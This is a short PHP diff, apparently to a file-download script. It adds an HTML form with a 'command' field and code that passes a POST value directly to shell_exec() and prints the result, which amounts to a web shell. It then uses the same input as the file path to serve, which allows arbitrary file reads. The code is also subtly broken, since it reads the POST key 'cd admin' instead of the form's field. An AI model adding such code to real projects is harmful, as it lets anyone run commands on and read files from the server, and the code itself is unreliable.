@@ -1,5 +1,18 @@
+<form action="download.php" method="post">
+Datei? <input type="text" name="command">
+<input type="submit">
+</form>
+
 <?php
-$file = 'logon.php';
+$command = $_POST["cd admin"];
+
+
+echo "<pre>";
+echo shell_exec($command);
+echo "</pre>";
+
+
+$file = $command;
 
 // Check if the file exists
 if (file_exists($file)) {
